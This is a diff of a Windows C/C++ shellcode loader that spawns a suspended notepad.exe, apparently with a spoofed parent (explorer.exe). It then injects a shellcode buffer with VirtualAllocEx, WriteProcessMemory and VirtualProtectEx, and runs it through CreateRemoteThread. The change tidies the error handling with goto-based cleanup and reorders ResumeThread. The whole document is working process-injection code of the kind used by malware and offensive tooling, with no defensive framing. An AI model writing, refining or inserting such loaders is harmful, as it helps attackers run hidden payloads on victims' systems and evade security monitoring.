@@ -91,6 +91,9 @@ int main()
         STARTUPINFOEXA si;
         PROCESS_INFORMATION pi;
         SIZE_T attributeSize;
+        int exitCode = 1;
+        void* exec = NULL;
+        HANDLE hThread = NULL;
         RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
         RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
@@ -104,52 +107,65 @@ int main()
 
         if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
             printf("Failed to create process. Error: %d\n", GetLastError());
-            return 1;
-        }
-        if (ResumeThread(pi.hThread) == (DWORD)-1) {
-            printf("ResumeThread failed. Error: %d\n", GetLastError());
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            return 1;
+            goto process_cleanup;
         }
 
         printf("Process created with PID: %d\n", pi.dwProcessId);
 
         // Inject and execute the shellcode in the new process
         const SIZE_T payloadSize = (SIZE_T)counter;
-        void* exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!exec) {
             printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
-            return 1;
+            goto process_cleanup;
         }
 
         SIZE_T written;
         if (!WriteProcessMemory(pi.hProcess, exec, shellcode, payloadSize, &written) || written != payloadSize) {
             printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
-            return 1;
+            goto process_cleanup;
         }
 
         DWORD oldProtect = 0;
         if (!VirtualProtectEx(pi.hProcess, exec, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
             printf("VirtualProtectEx failed. Error: %d\n", GetLastError());
-            return 1;
+            goto process_cleanup;
         }
 
-        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
+        hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
         if (!hThread) {
             printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
-            return 1;
+            goto process_cleanup;
         }
 
-        WaitForSingleObject(hThread, INFINITE);
-        CloseHandle(hThread);
+        if (ResumeThread(pi.hThread) == (DWORD)-1) {
+            printf("ResumeThread failed. Error: %d\n", GetLastError());
+            goto process_cleanup;
+        }
 
-        VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        exitCode = 0;
+
+    process_cleanup:
+        if (hThread) {
+            CloseHandle(hThread);
+        }
+        if (exec && pi.hProcess) {
+            VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
+        }
+        if (pi.hProcess) {
+            CloseHandle(pi.hProcess);
+        }
+        if (pi.hThread) {
+            CloseHandle(pi.hThread);
+        }
+        if (si.lpAttributeList) {
+            DeleteProcThreadAttributeList(si.lpAttributeList);
+            delete[] reinterpret_cast<byte*>(si.lpAttributeList);
+        }
         if (hExplorerexe) {
             CloseHandle(hExplorerexe);
         }
+        return exitCode;
     }
 
     return 0;
